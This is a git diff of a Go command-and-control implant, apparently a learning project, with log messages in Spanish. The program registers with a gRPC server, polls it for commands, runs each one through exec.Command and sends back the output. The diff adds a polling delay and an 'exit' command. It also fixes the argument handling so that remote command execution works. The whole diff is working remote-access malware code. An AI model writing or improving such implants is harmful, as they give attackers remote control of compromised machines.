@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"time"
 )
 
 func main() {
@@ -30,7 +31,10 @@ func main() {
 	ctx := context.Background()
 	identity := new(grpcapi.Identity)
 
-	identity.Name = os.Args[1]
+	if len(os.Args) == 2 {
+		identity.Name = os.Args[1]
+	}
+
 	identity, err = client.RegisterImplant(ctx, identity)
 	for {
 		cmd, err := client.FetchCommand(ctx, identity)
@@ -39,17 +43,22 @@ func main() {
 			log.Fatal("[!] Error al obtener un commando.", "ERROR", err)
 		}
 		if cmd.In == "" {
-			//time.Sleep(100)
+			time.Sleep(1000)
 			continue
 		} else {
 			log.Debug("[+] Comando recibido del servidor.", "CMD", cmd.In)
 		}
 		tokens := strings.Split(cmd.In, " ")
 		var c *exec.Cmd
-		if len(tokens) == 1 {
-			c = exec.Command(tokens[0])
-		} else if len(tokens) >= 1 {
-			c = exec.Command(tokens[0], tokens[:1]...)
+		if len(tokens) >= 1 {
+			if tokens[0] == "exit" {
+				os.Exit(0)
+			}
+			if len(tokens) == 1 {
+				c = exec.Command(tokens[0])
+			} else {
+				c = exec.Command(tokens[0], tokens[1:]...)
+			}
 		}
 		// Cambiar en un futuro a stderr y stdout
 		buf, err := c.CombinedOutput()
